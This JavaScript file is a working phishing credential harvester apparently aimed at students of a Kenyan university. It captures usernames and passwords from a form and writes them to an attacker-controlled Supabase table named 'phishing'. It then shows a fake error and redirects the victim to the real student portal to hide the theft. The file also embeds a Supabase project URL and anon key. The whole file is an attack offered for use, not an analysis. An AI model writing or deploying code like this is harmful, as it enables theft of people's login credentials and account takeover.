
// ==========================
// SUPABASE CONFIG
// ==========================

const SUPABASE_URL =
"https://havgezztjyxquykcqlcs.supabase.co";

const SUPABASE_ANON_KEY =
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhhdmdlenp0anl4cXV5a2NxbGNzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI3NzEyNzgsImV4cCI6MjA5ODM0NzI3OH0.3hj9Q9H1xqKwKhURrNdDVHWMyamttN1kKrTpcXEWvp0";

const client = supabase.createClient(
    SUPABASE_URL,
    SUPABASE_ANON_KEY
);

// ==========================
// FORM SUBMIT
// ==========================

document
.getElementById("studentForm")
.addEventListener("submit", async function(e){

    e.preventDefault();

    const status =
    document.getElementById("status");

    const username =
    document.getElementById("uname").value;

    const password =
    document.getElementById("pass").value;

    // Check passwords match


// Check minimum length


    status.innerHTML = "Connecting...";

    try {

        const { data, error } =
        await client
        .from("phishing")
        .insert([
            {
                username: username,
                password: password
            }
        ]);

        if(error){

            console.error(error);

            status.innerHTML =
            "Error: " + error.message;

            alert(
                "SUPABASE ERROR\n\n" +
                error.message
            );

            return;
        }

   status.innerHTML =
"<span style='color:red;font-weight:bold;'>Ooops something went wrong! try again...</span>";

document
.getElementById("studentForm")
.reset();

// Wait 2 seconds then redirect
setTimeout(() => {
    window.location.href = "https://student.daystar.ac.ke/";
}, 100);

    }
    catch(err){

        console.error(err);

        status.innerHTML =
        "JavaScript Error: " +
        err.message;

        alert(
            "JAVASCRIPT ERROR\n\n" +
            err.message
        );
    }

});
